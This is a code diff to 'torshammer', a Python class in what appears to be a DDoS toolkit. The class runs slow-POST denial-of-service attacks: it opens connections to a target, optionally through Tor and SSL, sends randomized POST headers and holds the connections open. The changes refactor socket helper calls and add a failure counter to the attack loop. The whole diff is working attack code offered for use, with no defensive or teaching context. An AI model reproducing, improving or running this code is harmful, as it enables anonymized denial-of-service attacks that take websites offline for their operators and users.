@@ -21,6 +21,7 @@ class torshammer(DDoS_Class):
         self.paths=paths
         self.ssl_on=ssl_on
         self.counter = 0
+        self.fails=0
         self.cookie = cookie
         self.user_agents = user_agents
         if not self.user_agents or len(self.user_agents) == 0:
@@ -55,12 +56,11 @@ class torshammer(DDoS_Class):
                     break
                 try:
                     if self.tor==True:
-                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
+                        s=Socket_Connection.get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                     else:
-                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
+                        s=Socket_Connection.get_socket_connection(self.target,self.port,timeout=self.timeout)
                     if self.port==443 or self.ssl_on==True:
-                        s=wrap_socket_with_ssl(s,self.target)
-                    self.counter += 1
+                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                     if self.logs == True:
                         sys.stdout.write(
                             "\rConnected to {}:{}...".format(self.target, self.port)
@@ -72,7 +72,7 @@ class torshammer(DDoS_Class):
                     if self.cookie:
                         ck = "Cookie: " + self.cookie + "\r\n"
                     s.send(
-                        reorder_headers_randomly(
+                        Socket_Connection.reorder_headers_randomly(
                             "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
                                 random.choice(self.paths),
                                 ck,
@@ -104,12 +104,13 @@ class torshammer(DDoS_Class):
                                 sys.stdout.flush()
                                 # print("Posted: {}".format(h))
                             time.sleep(random.uniform(0.1, 3))
+                            self.counter+=1
                         except:
+                            self.fails+=1
                             break
                     s.close()
                 except:
-                    pass
-                self.counter -= 1
+                    self.fails+=1
                 time.sleep(0.1)
                 if self.stop == True:
                     break
